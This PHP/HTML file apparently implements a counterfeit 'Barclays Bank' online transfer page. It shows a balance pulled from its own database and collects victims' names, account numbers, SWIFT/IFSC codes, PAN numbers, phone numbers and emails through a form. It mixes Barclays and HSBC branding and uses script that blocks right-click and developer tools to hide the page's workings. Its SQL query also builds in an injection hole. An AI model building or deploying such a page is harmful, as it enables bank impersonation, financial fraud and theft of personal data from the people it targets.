<?php
session_start();
include 'connection.php';


$email=$_SESSION['email'];



    $sql = "SELECT * FROM frean WHERE email='$email'";
    $result = mysqli_query($conn, $sql);
    
         if (mysqli_num_rows($result) > 0) 
         {

             while($row = mysqli_fetch_assoc($result)) 
                {
					$amount = $row["final"];
					$currency = $row["currency"];
                }
          
        } 


mysqli_close($conn);
?>
<html>
<title>Barclays Bank-Account Transfer</title>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="icon" type="png" href="image/logoshsbc.png" style="width:5%">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css"
        integrity="sha384-gfdkjb5BdAXd+lj+gudLWI+BXq4IuLW5IT+brZEZsLFm++aCMlF1V92rMkPaX4PP" crossorigin="anonymous">
    <link rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Amaranth:ital@1&family=Asap+Condensed:ital@1&family=Barlow+Semi+Condensed:wght@300&family=Big+Shoulders+Display:wght@300&family=DM+Sans:ital,wght@1,500&family=Dosis:wght@300;500&family=EB+Garamond:ital@1&family=Economica&family=Fauna+One&family=Italianno&family=Niconne&family=Smooch+Sans&family=Thasadith:ital@1&family=Yanone+Kaffeesatz&display=swap"
        rel="stylesheet">
</head>
<style>
* {
    font-family: 'Noto Sans JP', sans-serif;
}
</style>
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<style>
table {
    border-collapse: separate;
    border-spacing: 0;

}

th,
td {
    padding: 10px 15px;
}

thead {
    background: #395870;
    color: #fff;
}

th {
    font-weight: bold;
}

tbody tr:nth-child(even) {
    background: #f0f0f2;
}

td {
    border-bottom: 1px solid #cecfd5;
    border-right: 1px solid #cecfd5;
}

td:first-child {
    border-left: 1px solid #cecfd5;
}

.center {
    margin-left: auto;
    margin-right: auto;
}
</style>

<body>
    <div style="background-color:#00004d">
        <div class="container">
            <div class="row">
                <div class="col-md-8">
                    <p style="font-size:35px;color:#ffffff;font-family: 'Thasadith', sans-serif;padding-top:20px;">
                        Welcome To Barclays Bank Online Technology</p>
                </div>
                <div class="col-md-4">
                    <div style="height:20px;"></div>
                    <span
                        style="font-size:20px; font-family: 'Smooch Sans', sans-serif;color:#ffffff;align:center;padding-top:20px;">London
                        Time</span>
                    <p id="rest" style="font-family: 'Smooch Sans', sans-serif;color:#ffffff;font-size:20px;"></p>


                    <script>
                    var europeTime = new Date().toLocaleString("en-US", {
                        timeZone: "Europe/London"
                    });
                    europeTime = new Date(europeTime);
                    console.log('Europe time: ' + europeTime.toLocaleString())
                    document.getElementById('rest').innerHTML = europeTime.toLocaleString();
                    </script>
                </div>
            </div>
        </div>
    </div>
    <div style="background-color:#ffffff">
        <div class="container">
            <div class="row">
                <div class="col-md-3">
                    <a href="index.php"><img src="Image/barclays-bank-logo-png.png" title="Barclays Bank"
                            style="width:60%;margin-top:20px;"></a>
                </div>
                <div class="col-md-4">
                    <p
                        style="color:#000000;float:right;padding-top:20px;font-family: 'Smooch Sans', sans-serif;font-size:25px;">
                        Your IP address is:
                        <? echo $_SERVER["REMOTE_ADDR"]; ?>
                </div>
                <div class="col-md-5">
                    <marquee width="100%" behavior="alternate">
                        <p
                            style="padding-top:20px;color:#000000;font-family: 'Smooch Sans', sans-serif;font-size:30px;">
                            Important Notice: Do not share your account details
                            to any one. Any issues do contact us:</p>
                    </marquee>
                </div>
            </div>
        </div>
    </div>

    <div style="height:30px"></div>

    <div class="container">
        <div class="row">
            <div class="col-md-6">
                <div id="Sign In" align="center">
                    <p style="float:center;font-family: 'Amaranth', sans-serif;font-size:25px;">Available Balance :
                        <?=@$currency?>
                        <?=@$amount?></p>
                    <span style="color:red"></span>
                </div>
            </div>
        </div>
    </div>

    <div class="dimensions">
        <div class="container">
            <div class="row">

                <div class="col-md-12">

                    <table class="table table-borderless table-sm table-register"
                        style="border:2px solid red;align:center;width:80%;margin-left:auto;margin-right:auto;">

                        <tbody>
                            <form action="transfer.php">
                                <span style="color:red;"></span>
                                <table class="table table-borderless table-sm table-register"
                                    style="border:2px solid #666633;width:900px;margin-left:auto;margin-right:auto;">

                                    <tbody>
                                        <tr style="background-color:#669999;">

                                            <td colspan="4"> <span class="blinking"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:25px;">
                                                    &nbsp &nbsp &nbsp &nbsp &nbsp
                                                    &nbsp
                                                    &nbsp
                                                    &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                                                    &nbsp
                                                    &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                                                    &nbsp
                                                    &nbsp &nbsp &nbsp &nbsp &nbsp
                                                    Follow Every Instructions Below To Transfer</span></td>

                                        </tr>
                                        <tr>
                                        </tr>
                                        <tr>
                                            <th><span
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">Enter
                                                    Name </span></th>
                                            <td>

                                                <select id="inputState" name='gender'>
                                                    <option selected
                                                        style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">
                                                        Mr.</option>
                                                    <option
                                                        style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">
                                                        Mrs.</option>
                                                    <option
                                                        style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">
                                                        Miss.</option>

                                                </select>

                                            </td>
                                            <th><span
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">Enter
                                                    Name </span></th>
                                            <td>
                                                <input type="text" placeholder="Enter Name" name="name"
                                                    title="Enter Name"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;width:200px;">

                                            </td>
                                        </tr>
                                        <tr>
                                            <th><span
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">Enter
                                                    Bank Name : </span></th>
                                            <td><input type="text" placeholder="Name Of bank" name="bank"
                                                    title="Name of Bank"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;font-size:20px;width:200px;">
                                            </td>
                                            <th><span
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">Enter
                                                    Account No: </span></th>
                                            <td><input type="text" placeholder="Enter Account No" name="number"
                                                    title="Enter Account No"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;font-size:20px;width:200px;">
                                            </td>

                                        </tr>

                                        <tr>
                                            <th><span style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">
                                                    Enter SWIFT / IFSC Code : </span></th>
                                            <td><input type="text" placeholder="IFSC Code" name="code" title="IFSC Code"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;font-size:20px;width:200px;">
                                            </td>
                                            <th><span
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">Enter
                                                    Pan Number : </span></th>
                                            <td><input type="text" placeholder="Enter Pan Number" name="pan"
                                                    title="Enter  Pan Number"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;font-size:20px;width:200px;">
                                            </td>
                                        </tr>

                                        <tr>
                                            <th><span
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">Enter
                                                    Bank Branch : </span></th>
                                            <td><input type="text" placeholder="Enter Bank Branch" name="branch"
                                                    title="Enter Bank Branch"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;font-size:20px;width:200px;">
                                            </td>

                                            <th><span
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">Enter
                                                    Phone No : </span></th>
                                            <td style="bckground-color:#000000"><input type="text"
                                                    placeholder="Enter Phone No" name="phone" title="Enter Phone No"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;font-size:20px;width:200px;">
                                            </td>

                                        </tr>


                                        <tr>
                                            <th><span
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">Enter
                                                    Email: </span></th>
                                            <td><input type="text" placeholder="Enter Email" name="email"
                                                    title="Enter Email"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;width:200px;">
                                            </td>
                                            <th><span
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">Enter
                                                    Pin / Poastal Code : </span></th>
                                            <td><input type="text" placeholder="Enter Pin Code " name="pin"
                                                    title="Enter Pin Code"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;font-size:20px;width:200px;">
                                            </td>
                                        </tr>


                                        <tr>
                                            <th><span
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">Enter
                                                    Currency : </span></th>
                                            <td>
                                                <select id="inputState" name='currency' title="Enter Currency">
                                                    <option
                                                        style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">
                                                        <?=@$currency?></option>
                                                </select>
                                            </td>
                                            <th>
                                                <spann style="font-family: 'Smooch Sans', sans-serif;font-size:20px;">
                                                    Enter Amount To Transfer : </span>
                                            </th>
                                            <td><input type="number" placeholder="Enter Amount" name="amount"
                                                    title="Enter Amount To Transfer"
                                                    style="font-family: 'Smooch Sans', sans-serif;font-size:20px;font-size:20px;width:200px;">
                                            </td>

                                        </tr>

                                        <tr>
                                            <td></td>
                                            <td></td>

                                            <td><br>
                                                <div class="submit"><input name="submit" value="Transfer Now"
                                                        onclick='javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions("ctl00$ContentPlaceHolder1$SUBMIT", "", true, "chk", "", false, false))'
                                                        id="ctl00_ContentPlaceHolder1=SUBMIT"
                                                        class="btn btn-block bg-default btn-flat "
                                                        style="width:140px; color:#fff;  margin-bottom:30px; background:#D4090C;font-family: 'Smooch Sans', sans-serif;font-size:20px;"
                                                        type="submit"></div>
                                            </td>

                                        </tr>
                            </form>
                        </tbody>
                    </table>




                    <!-- <tr>
									  <td style="color:black">b.No frills Account /Basic Savings Bank</td>
									  <td style="color:black">4.00%</td>
									  <td style="color:black">4.00%</td>
									  <td></td>
									</tr>

									<tr style="background:red">
									  <td>Non-Resident</td>
									  <td></td>
									  <td></td>
									  <td></td>
									</tr> -->



                    </tbody>
                    </table>



                </div>



            </div>

        </div>
    </div>
    </div>


</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script>
document.addEventListener('contextmenu', event => event.preventDefault());

$(document).keydown(function(event) {
    if (event.keyCode == 123) { // Prevent F12
        return false;
    } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
        return false;
    }
});
</script>

</html>